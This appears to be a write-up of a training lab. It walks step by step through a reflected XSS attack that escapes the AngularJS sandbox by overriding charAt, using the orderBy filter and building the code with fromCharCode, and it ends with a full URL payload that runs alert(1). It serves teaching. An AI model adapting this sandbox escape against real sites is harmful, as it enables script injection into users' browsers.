Reflected XSS in AngularJS – Sandbox Escape Without Strings

Lab Difficulty: Apprentice
Vulnerability: Reflected XSS / AngularJS Sandbox Escape

Summary

This one’s pretty sneaky. The page uses AngularJS, blocks $eval, and doesn’t let you use string literals in expressions (so no "..."). But Angular’s sandbox isn’t perfect. By messing with how it checks strings and finding the right context to evaluate code, you can still get it to run alert(1).

Basically, we’re tricking Angular into letting our code slip through its safety net.

Steps Taken

Step 1: Break AngularJS’s string sandbox

We start by doing this:

toString().constructor.prototype.charAt = [].join


Why? Angular normally checks strings character by character with charAt to make sure nothing sketchy runs. By overwriting charAt with [].join, we break that check.

Nothing runs yet, but Angular’s “safe mode” is now effectively disabled. Interesting.

Step 2: Find a place Angular will actually evaluate an expression

We use this context:

[1] | orderBy:

[1] = just a single-element array, doesn’t matter what it is.

| orderBy: = Angular filter that evaluates whatever you pass to it.

The filter is important because even with the sandbox broken, Angular only runs expressions in certain spots. This gives us our hook.

Step 3: Build the payload without quotes

toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)


Breakdown of the numbers → letters:

Number	Character
120	x
61	=
97	a
108	l
101	e
114	r
116	t
40	(
49	1
41	)

Resulting string = "x=alert(1)"

Why toString().constructor instead of String? Direct strings are blocked by the sandbox. This is Angular-approved sneaky indirect access.

Step 4: Complete the expression

[1] | orderBy:toString().constructor.fromCharCode(...) = 1


=1 just keeps the syntax happy so Angular doesn’t freak out. Because charAt is broken, the string passes through unescaped. Angular evaluates "x=alert(1)" → boom, runs alert(1).

Step 5: Final payload in URL

https://YOUR-LAB-ID.web-security-academy.net/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
